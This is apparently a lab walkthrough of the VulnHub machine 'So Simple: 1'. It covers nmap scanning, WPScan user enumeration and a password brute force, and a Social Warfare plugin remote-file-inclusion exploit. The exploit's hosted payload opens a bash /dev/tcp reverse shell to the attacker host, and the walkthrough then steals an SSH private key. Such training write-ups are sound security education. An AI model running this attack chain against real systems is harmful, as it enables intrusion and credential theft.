# So Simple: 1

- **Machine:** So Simple: 1
- **Download:** https://www.vulnhub.com/entry/so-simple-1,515/

![](795-1.png)

---

# Machine Setup

1. Extract the downloaded archive.

```bash
7z e So-Simple-1.7z
```

![](795-2.png)

2. Import the **OVA** file into VirtualBox.
3. Click **Finish**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

Identify the IP address assigned to the target.

```bash
nmap -sn 192.168.2.0/24
```

![](795-3.png)

---

## Full Nmap Scan

Perform a complete scan to identify open ports, services, operating system information, and default NSE script results.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.108
```

![](795-4.png)

---

## Optional Enumeration

Scan all ports.

```bash
nmap -v -p- 192.168.2.108
```

Run a standard service detection scan.

```bash
nmap -sC -sV -A 192.168.2.108
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.108
```

![](795-5.png)

---

# Web Enumeration

Browse the available web pages.

```text
http://192.168.2.108
```

```text
http://192.168.2.108/wordpress/
```

```text
http://192.168.2.108/wordpress/wp-login.php
```

---

## WordPress User Enumeration

Enumerate WordPress usernames.

```bash
wpscan --url http://192.168.2.108/wordpress -e u
```

![](795-6.png)

If enumeration fails, update **WPScan** to the latest version and repeat the scan.

---

## Password Brute Force

Attempt to recover valid WordPress credentials.

```bash
wpscan --url http://192.168.2.108/wordpress -U admin,max -P /opt/rockyou.txt -t 50
```

![](795-7.png)

Recovered credentials:

```text
Username : max
Password : opensesame
```

---

## Login to WordPress

Authenticate to the administrator panel.

```text
http://192.168.2.108/wordpress/wp-login.php
```

![](795-8.png)

---

## Identify Installed Plugin

Search for the installed **Social Warfare** plugin vulnerability.

Reference:

```text
https://www.exploit-db.com/exploits/46794
```

Download the exploit.

![](795-9.png)

Review the exploit source.

```bash
cat 46794.py
```

![](795-10.png)

The exploit targets the following vulnerable endpoint:

```text
http://192.168.2.108/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s
```

![](795-11.png)

---

# Reverse Shell

Create a payload file.

```bash
nano shell.txt
```

Insert the payload.

```html
<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'")</pre>
```

![](795-12.png)

---

## Host the Payload

Start a Python web server.

```bash
python3 -m http.server 80
```

---

## Start a Listener

```bash
nc -nlvp 443
```

---

## Trigger the Vulnerability

Supply the hosted payload to the vulnerable endpoint.

```text
http://192.168.2.108/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.2.219/shell.txt
```

A reverse shell is received.

![](795-13.png)

---

# SSH Access

Navigate to the user's SSH directory.

```bash
cd /home
```

```bash
cd max
```

```bash
cd .ssh
```

![](795-14.png)

Display the private key.

```bash
cat id_rsa
```

![](795-15.png)

---

## Save the Private Key

Create a file on the attacker machine.

```bash
nano id_rsa
```

Paste the recovered private key.

![](795-16.png)

Assign the correct permissions.

```bash
chmod 600 id_rsa
```

---

## SSH Login

Authenticate using the recovered SSH private key.

```bash
ssh -i id_rsa max@192.168.2.108
```

![](795-17.png)

---

# Vulnerability Summary

| No. | Vulnerability | Impact |
|-----|---------------|--------|
| 1 | Weak WordPress credentials | Administrative access |
| 2 | Vulnerable Social Warfare plugin | Remote Code Execution (RCE) |
| 3 | Remote file inclusion via `swp_url` | Command execution |
| 4 | Exposed SSH private key | Passwordless SSH access |

---

# Key Learning

- WPScan is useful for enumerating WordPress users and testing weak credentials.
- Outdated WordPress plugins can expose critical Remote Code Execution vulnerabilities.
- Remote content loading functionality should always validate external resources.
- Sensitive files such as SSH private keys should never be accessible to the web server user.
- Recovering an SSH private key often provides more reliable persistence than a reverse shell.

---

# Summary

The assessment began with network reconnaissance, identifying a WordPress installation on the target system. WPScan successfully enumerated users and recovered valid administrator credentials through a password attack. After authentication, an outdated **Social Warfare** plugin was identified and exploited using its vulnerable `admin-post.php` endpoint to achieve Remote Code Execution. A reverse shell was established, allowing local enumeration of the system. During post-exploitation, an exposed SSH private key belonging to the **max** user was discovered, copied to the attacker machine, assigned appropriate permissions, and used to establish persistent SSH access to the target.